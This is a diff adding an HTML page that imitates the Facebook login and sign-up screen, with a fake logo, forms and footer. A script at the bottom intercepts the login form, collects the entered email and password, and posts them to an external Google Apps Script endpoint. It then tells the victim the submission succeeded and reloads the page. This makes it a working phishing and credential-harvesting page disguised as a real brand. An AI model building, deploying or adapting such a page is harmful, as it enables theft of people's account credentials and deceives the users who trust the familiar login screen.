@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook.com</title>
+    <link rel="stylesheet" href="fb.css" type="text/css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <a class="facebook" href="index.html">facebook</a>
+            </div>
+            <div class="login">
+                <form id="submit-form" action="">
+                    <table class="login-controls">
+                        <tr>
+                            <td><label>Email or phone</label></td>
+                            <td><label>Password</label></td>
+                        </tr>
+                        <tr>
+                            <td><input type="text" class="login-page" id="fname" placeholder="Enter your email" name="email"></td>
+                            <td><input type="password" class="login-page" id="lname" placeholder="password" name="password"></td>
+                            <td><input type="submit" value="Log In" class="submit"></td>
+                        </tr>
+                        <tr>
+                            <td></td>
+                            <td><a href="index.html" style="color: #ffffff;" class="forgot">forgotten account?</a></td>
+                        </tr>
+                    </table>
+                </form>
+            </div>2
+        </div>
+        <div class="main-body">
+            <div class="left-sec">
+                <p class="body-content">Facebook helps you content and share with the<br> people in your life.</p>
+                <img class="image" src="fb.png">
+            </div>
+            <div class="right-sec">
+                <form action="" id="signup-form">
+                    <h1><b>Create an account</b></h1>
+                    <p class="para">it's quick and easy.</p>
+                    <input class="name" type="text" placeholder="First name">
+                    <input class="surname" type="text" placeholder="Surname">
+                    <br>
+                    <input class="mob-eml" type="email" placeholder="Mobile number or email address">
+                    <br>
+                    <input class="mob-eml" type="password" placeholder="New password">
+                    <br><br>
+                    <p class="bi-ge">Birthday</p>
+                    <input class="day" type="number" placeholder="30">
+                    <select class="month" aria-placeholder="April">
+                        <option>January</option>
+                        <option>February</option>
+                        <option>March</option>
+                        <option>April</option>
+                        <option>May</option>
+                        <option>June</option>
+                        <option>July</option>
+                        <option>August</option>
+                        <option>September</option>
+                        <option>October</option>
+                        <option>November</option>
+                        <option>December</option>
+                    </select>
+                    <input class="year" type="number" placeholder="2020">
+                    <img src="question.png" class="question">
+                    <br>
+                    <p class="bi-ge">Gender</p>
+                    <input type="radio">
+                    <label class="gender">Femail</label>
+                    <input type="radio">
+                    <label class="gender">Mail</label>
+                    <input type="radio">
+                    <label class="gender">Custom</label>
+                    <img src="question.png" alt="" class="question">
+                    <br>
+                    <p class="terms">By clicking Sign up, you agree to our <a class="terms-link" href="terms.html">Terms</a>,<a class="terms-link" href="data.html">Data Policy</a><br>and <a class="terms-link" href="cookey.html">Cookie Policy</a>. You may receive SMS notifications from <br>us and can opt out at any time.</p>
+                    <br>
+                    <input class="signup" type="submit" value="Sign Up">
+                </form>
+                <br><br>
+                <p class="band"><a class="page-cre" href="pagecreation">Create a Page</a> for a celebrity, band or business.</p>
+            </div>
+        </div>
+        <div class="footer">
+            <p class="footer-eng"><a>English (UK)</a></p><p class="footer-lag"><a href="malayalam" class="language">Malayalam</a></p><p class="footer-lag"><a href="tamil" class="language">Tamil</a></p><p class="footer-lag"><a class="language" href="arabic">arabic</a></p>
+            <hr color="gray" width="80%">
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.3/dist/jquery.validate.js"></script>
+    <script src="script.js"></script>
+    <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbx3ZkI_bGB4t-zc2WSoU7dia7NxgmzFyraYKqOv3pYzqSHVYJx2tgcu6_B4osGm1ilz/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("Form submitted successfully")
+                    window.location.reload()
+                    //window.location.href="https://google.com"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
+</body>
+</html>
